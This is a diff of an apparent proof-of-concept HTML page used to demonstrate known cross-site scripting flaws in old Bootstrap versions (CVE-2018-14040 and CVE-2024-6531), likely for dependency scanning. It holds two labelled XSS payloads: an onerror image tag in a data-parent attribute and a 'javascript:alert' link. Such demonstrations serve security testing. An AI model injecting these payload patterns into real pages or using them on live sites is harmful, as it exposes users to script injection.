@@ -7,13 +7,18 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
   </head>
   <body>
-    <h1>POC SCA - Bootstrap 3.3.7 CDN - CVE-2018-14040 - Bootstrap < 3.4.0 || < 4.1.2 - Requires user interaction</h1>
+    <h1>POC SCA - Bootstrap 3.3.7 CDN</h1>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
     <div class="mb-5">
         <a href="." class="btn btn-primary btn-lg px-4">Local files</a>
     </div>
     <br>
-    <a id="x" data-toggle="collapse" href="#x" data-parent="<img src=x onerror=alert(1) />">XSS</a>
+    <a id="x" data-toggle="collapse" href="#x" data-parent="<img src=x onerror=alert(1) />">XSS CVE-2018-14040 Bootstrap < 3.4.0 || < 4.1.2</a>
+    <br>
+    <div id="myCarousel" class="carousel"></div>
+    <a href="javascript:alert('XSS CVE-2024-6531 - bootstrap >=4.0.0 &lt;5.0.0-beta1')" data-slide="prev">
+      Previous Slide
+    </a>
   </body>
 </html>
